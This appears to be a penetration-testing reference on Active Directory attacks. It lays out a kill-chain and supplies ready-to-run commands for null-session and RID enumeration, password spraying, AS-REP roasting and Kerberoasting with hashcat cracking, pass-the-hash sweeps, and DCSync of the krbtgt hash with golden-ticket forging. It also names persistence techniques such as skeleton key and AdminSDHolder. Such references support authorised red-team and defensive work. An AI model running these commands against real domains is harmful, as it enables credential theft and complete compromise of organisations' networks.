# Active Directory Enumeration & Attack Methodology

Hub document for Active Directory attacks: the kill-chain, enumeration tooling, SID/ACL primer, and a map to the deep-dive files in this directory. Grounded in current (2025-2026) tradecraft.

Deep-dive companions in this folder:
- `kerberos-attacks.md` — Kerberoasting, AS-REP roasting, PtT, overpass-the-hash, Golden/Silver/Diamond/Sapphire tickets, delegation (unconstrained/constrained/RBCD), shadow credentials.
- `adcs-esc-attacks.md` — AD CS / Certipy ESC1–ESC16.
- `acl-abuse-and-dacl.md` — GenericAll/Write, WriteDACL, WriteOwner, AddSelf, GPO abuse, DCSync rights.
- `bloodhound-and-recon.md` — BloodHound CE, SharpHound/azurehound, Cypher queries, PowerView/AD module recon.
- `ntlm-relay-and-coercion.md` — Responder, mitm6, coercion (PetitPotam/PrinterBug/DFSCoerce), ntlmrelayx targets.

See also `05-privilege-escalation/windows/impacket-reference.md` and `07-password-attacks/windows-hashes/windows-hash-attacks.md`.

---

## 0. The AD Kill-Chain (mental model)

```
 No creds                     Any domain creds                Privileged / DA
 ────────                     ────────────────                ───────────────
 anon LDAP / RID cycle   →    BloodHound recon           →    DCSync (krbtgt)
 AS-REP roast (no auth)  →    Kerberoast (SPNs)          →    Golden ticket
 NTLM poison/relay       →    ACL abuse / shadow creds   →    Domain persistence
 LLMNR/NBNS spoof        →    delegation abuse (RBCD)    →    cross-trust / forest
 password spray          →    ADCS ESC1-16 → cert→TGT    →    Enterprise Admin
```

**Operating loop:** enumerate → find a path (usually via BloodHound) → take the cheapest hop → re-enumerate as the new principal → repeat until DA/EA. Re-run SharpHound after each compromise and **mark owned** in BloodHound.

---

## 1. Initial Access (no/low creds)

```bash
# Connect to a host (RDP/WinRM)
xfreerdp /u:user /d:domain /p:pass /v:<ip> /dynamic-resolution +clipboard
evil-winrm -i <ip> -u user -p pass
evil-winrm -i <ip> -u user -H <NTLM_HASH>        # pass-the-hash over WinRM

# Anonymous / null enumeration
nxc smb <DC_IP> -u '' -p ''                       # null session
nxc smb <DC_IP> -u guest -p ''
enum4linux-ng -A <DC_IP>
rpcclient -U "" -N <DC_IP> -c "enumdomusers;querydominfo"
ldapsearch -x -H ldap://<DC_IP> -s base namingcontexts   # anonymous LDAP base

# RID cycling to build a user list with no creds
nxc smb <DC_IP> -u guest -p '' --rid-brute
impacket-lookupsid DOMAIN/guest@<DC_IP>

# User enumeration via Kerberos (no creds, no lockout) → seed roasting/spraying
kerbrute userenum -d domain.local --dc <DC_IP> users.txt
```

### Get an initial credential
```bash
# AS-REP roast accounts with pre-auth disabled (no creds needed) — see kerberos-attacks.md
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Password spray (mind lockout policy: nxc shows badPwdCount/lockoutThreshold)
nxc smb <DC_IP> -u users.txt -p 'Spring2026!' --continue-on-success
kerbrute passwordspray -d domain.local --dc <DC_IP> users.txt 'Spring2026!'

# Poison + relay on the wire — see ntlm-relay-and-coercion.md
sudo responder -I eth0
```

---

## 2. Authenticated Enumeration

### 2.1 NetExec (nxc) — the swiss army knife
```bash
# SMB landscape: hosts, signing, OS, domain
nxc smb <range> -u user -p pass
nxc smb <range> -u user -p pass --gen-relay-list relay_targets.txt   # signing:False hosts
nxc smb <DC_IP> -u user -p pass --users --groups --pass-pol --shares
nxc smb <DC_IP> -u user -p pass --loggedon-users --sessions
nxc smb <range> -u user -p pass --shares -M spider_plus             # crawl shares for secrets

# LDAP recon
nxc ldap <DC_IP> -u user -p pass --kerberoasting kerb.txt
nxc ldap <DC_IP> -u user -p pass --asreproast asrep.txt
nxc ldap <DC_IP> -u user -p pass --find-delegation
nxc ldap <DC_IP> -u user -p pass --trusted-for-delegation --admin-count
nxc ldap <DC_IP> -u user -p pass -M maq                              # MachineAccountQuota
nxc ldap <DC_IP> -u user -p pass -M adcs                            # find AD CS / templates
nxc ldap <DC_IP> -u user -p pass -M laps                            # read LAPS if permitted
nxc ldap <DC_IP> -u user -p pass --bloodhound --collection all --dns-server <DC_IP>

# Validate creds & find where you're local admin (Pwn3d!)
nxc smb <range> -u user -p pass            # "(Pwn3d!)" = local admin there
nxc smb <range> -u user -H <NThash>        # pass-the-hash sweep
nxc winrm <range> -u user -p pass
nxc mssql <ip>  -u user -p pass --local-auth -q 'SELECT @@version'
```

### 2.2 BloodHound collection (do this early — see bloodhound-and-recon.md)
```bash
# Remote, from Linux (no agent on host)
bloodhound-python -u user -p pass -d domain.local -ns <DC_IP> -c All --zip
nxc ldap <DC_IP> -u user -p pass --bloodhound --collection all
```
```powershell
# On a domain host
.\SharpHound.exe -c All --zipfilename loot.zip
```

### 2.3 PowerView / AD module (on-host)
```powershell
Import-Module .\PowerView.ps1
Get-Domain; Get-DomainController; Get-DomainPolicy
Get-DomainUser -SPN | select samaccountname,serviceprincipalname        # kerberoastable
Get-DomainUser -PreauthNotRequired                                       # AS-REP roastable
Get-DomainComputer -Unconstrained                                        # unconstrained delegation
Get-DomainComputer -TrustedToAuth                                        # constrained delegation
Find-LocalAdminAccess                                                    # where am I admin?
Find-InterestingDomainAcl -ResolveGUIDs | ? {$_.IdentityReferenceName -eq "$env:USERNAME"}
Get-DomainTrust; Get-ForestTrust                                         # trusts/forest
Find-DomainShare -CheckShareAccess
```

---

## 3. Privilege Escalation Paths (where to go next)

| You found... | Go to |
|--------------|-------|
| Account with SPN | **Kerberoast** → crack → reuse (`kerberos-attacks.md`) |
| Account with pre-auth disabled | **AS-REP roast** → crack (`kerberos-attacks.md`) |
| GenericAll/WriteDACL/WriteOwner/ForceChangePassword on object | **ACL abuse** (`acl-abuse-and-dacl.md`) |
| GenericWrite on a user/computer | **Shadow Credentials** or targeted Kerberoast (`kerberos-attacks.md`) |
| Unconstrained/constrained/RBCD delegation | **Delegation abuse** (`kerberos-attacks.md`) |
| AD CS / vulnerable cert template | **ESC1-16** → cert → TGT (`adcs-esc-attacks.md`) |
| SMB signing off + coercion possible | **NTLM relay** (`ntlm-relay-and-coercion.md`) |
| Local admin on a host | dump LSASS/SAM → PtH sweep → re-enumerate |
| DCSync rights (Get-Changes-All) | `secretsdump -just-dc` → krbtgt → golden ticket |
| LAPS read rights | read local admin pw → lateral |
| GPP `cpassword` in SYSVOL | `gpp-decrypt` (legacy) |

---

## 4. Domain Dominance & Persistence

```bash
# Once DA-equivalent: dump everything
impacket-secretsdump DOMAIN/da:pass@<DC_IP> -just-dc -outputfile dc

# krbtgt hash → Golden Ticket (see kerberos-attacks.md)
impacket-secretsdump DOMAIN/da:pass@<DC_IP> -just-dc-user krbtgt

# Skeleton key / DSRM / AdminSDHolder / silver tickets = stealthier persistence (kerberos-attacks.md)
```
Lateral execution (see impacket-reference.md): `psexec`/`wmiexec`/`smbexec`/`atexec`/`dcomexec`, evil-winrm, or `nxc <proto> -x/-X`.

---

## 5. SID, RID & ACL Primer

### SID structure
```
S-R-I-S1-S2-S3-...-RID
 R  = revision (1)         I  = authority (5 = NT Authority)
 S1-S3 = domain identifier  RID = relative id (unique per principal)
```
### Well-known RIDs
| RID | Principal | RID | Principal |
|-----|-----------|-----|-----------|
| 500 | Administrator | 516 | Domain Controllers |
| 501 | Guest | 518 | Schema Admins |
| 502 | krbtgt | 519 | Enterprise Admins |
| 512 | Domain Admins | 520 | Group Policy Creator Owners |
| 513 | Domain Users | 525 | Protected Users |
| 515 | Domain Computers | 526/527 | Key/Enterprise Key Admins |

### Resolve names/SIDs
```powershell
Convert-NameToSid DOMAIN\user      # PowerView
Convert-SidToName <SID>
```
```bash
impacket-lookupsid DOMAIN/user:pass@<DC_IP>
```

### Dangerous ACL rights (full detail in acl-abuse-and-dacl.md)
| Right | Abuse |
|-------|-------|
| GenericAll | full control (reset pw, add to group, shadow creds, RBCD) |
| GenericWrite / WriteProperty | set SPN (targeted kerberoast), set msDS-KeyCredentialLink (shadow creds), set RBCD |
| WriteDACL | grant yourself GenericAll / DCSync rights |
| WriteOwner | take ownership → grant rights |
| ForceChangePassword / User-Force-Change-Password | reset target's password |
| AllExtendedRights | password reset, DCSync (on domain object) |
| Self / AddSelf | add self to a group |
| DS-Replication-Get-Changes(-All) | **DCSync** |

---

## 6. Quick Reference

```bash
# RECON (no creds)
kerbrute userenum -d dom --dc <DC> users.txt
nxc smb <DC> -u guest -p '' --rid-brute
impacket-GetNPUsers dom/ -usersfile users.txt -no-pass -format hashcat -o asrep.txt

# RECON (creds)
nxc ldap <DC> -u u -p p --kerberoasting k.txt --asreproast a.txt --find-delegation
bloodhound-python -u u -p p -d dom -ns <DC> -c All --zip

# ROAST + CRACK
impacket-GetUserSPNs dom/u:p -dc-ip <DC> -request -outputfile k.txt
hashcat -m 13100 k.txt rockyou.txt        # kerberoast
hashcat -m 18200 a.txt rockyou.txt        # as-rep

# WHERE AM I ADMIN / PtH
nxc smb <range> -u u -H <NThash>          # (Pwn3d!)

# DCSYNC / GOLDEN
impacket-secretsdump dom/u:p@<DC> -just-dc-user krbtgt
impacket-ticketer -nthash <krbtgt> -domain-sid <SID> -domain dom Administrator
```

---

## References

- The Hacker Recipes – Active Directory — https://www.thehacker.recipes/ad/
- HackTricks – Active Directory Methodology — https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- BloodHound CE docs — https://bloodhound.specterops.io/
- NetExec wiki — https://www.netexec.wiki/
- PowerView (PowerSploit/dev) — https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
- kerbrute — https://github.com/ropnop/kerbrute
- Orange Cyberdefense AD mindmap — https://orange-cyberdefense.github.io/ocd-mindmaps/
